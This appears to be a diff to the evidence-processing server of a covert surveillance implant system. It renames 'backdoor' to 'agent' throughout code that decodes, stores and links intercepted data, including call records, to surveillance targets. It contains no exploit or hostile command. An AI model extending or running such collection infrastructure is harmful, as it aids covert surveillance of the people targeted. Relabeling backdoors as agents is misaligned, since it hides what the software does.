@@ -27,11 +27,11 @@ class InstanceProcessor
     @state = :stopped
     @seconds_sleeping = 0
     
-    # get info about the backdoor instance from evidence db
+    # get info about the agent instance from evidence db
     @info = RCS::EvidenceManager.instance.instance_info @id
     raise "Instance \'#{@id}\' cannot be found." if @info.nil?
     
-    trace :info, "Created processor for backdoor #{@info['ident']}:#{@info['instance']}"
+    trace :info, "Created processor for agent #{@info['ident']}:#{@info['instance']}"
     
     # the log key is passed as a string taken from the db
     # we need to calculate the MD5 and use it in binary form
@@ -89,7 +89,7 @@ class InstanceProcessor
             # deserialize binary evidence
             evidences = RCS::Evidence.new(@key).deserialize(data)
             if evidences.nil?
-              trace :debug, "error deserializing evidence #{evidence_id} for backdoor #{@id}, skipping ..."
+              trace :debug, "error deserializing evidence #{evidence_id} for agent #{@id}, skipping ..."
               next
             end
             
@@ -101,11 +101,11 @@ class InstanceProcessor
               # delete empty evidences
               if evidence.empty?
                 RCS::EvidenceManager.instance.del_evidence(evidence.info[:db_id], @id)
-                trace :debug, "deleted empty evidence for backdoor #{@id}"
+                trace :debug, "deleted empty evidence for agent #{@id}"
                 next
               end
               
-              # store backdoor instance in evidence (used when storing into db)
+              # store agent instance in evidence (used when storing into db)
               evidence.info[:instance] = @id
               
               # find correct processing module and extend evidence
@@ -118,7 +118,7 @@ class InstanceProcessor
                 info = RCS::EvidenceManager.instance.instance_info(@id)
               end
 
-              evidence.info[:backdoor] = info["bid"] unless info.nil?
+              evidence.info[:agent] = info["bid"] unless info.nil?
               
               case evidence.info[:type]
                 when :CALL
@@ -174,8 +174,8 @@ class InstanceProcessor
   def store_evidence(info)
 
     # retrieve the target and the dynamic collection for the evidence
-    backdoor = ::Item.backdoors.where({_id: evidence.info[:backdoor]}).first
-    target = ::Item.targets.where({_id: backdoor[:path].last}).first
+    agent = ::Item.agents.where({_id: evidence.info[:agent]}).first
+    target = ::Item.targets.where({_id: agent[:path].last}).first
     ev = ::Evidence.dynamic_new target[:_id].to_s
 
     ev.acquired = evidence.info[:acquired].to_i
@@ -183,13 +183,13 @@ class InstanceProcessor
     ev.type = evidence.info[:type]
     ev.relevance = 1
     ev.blotter = false
-    ev.item = [ backdoor[:_id] ]
+    ev.item = [ agent[:_id] ]
     ev.data = evidence.info[:data]
 
     # save the binary data (if any)
     unless evidence.info[:grid_content].nil?
       ev.data[:_grid_size] = evidence.info[:grid_content].bytesize
-      ev.data[:_grid] = GridFS.instance.put(evidence.info[:grid_content], {filename: backdoor[:_id].to_s}) unless evidence.info[:grid_content].nil?
+      ev.data[:_grid] = GridFS.instance.put(evidence.info[:grid_content], {filename: agent[:_id].to_s}) unless evidence.info[:grid_content].nil?
     end
 
     ev.save
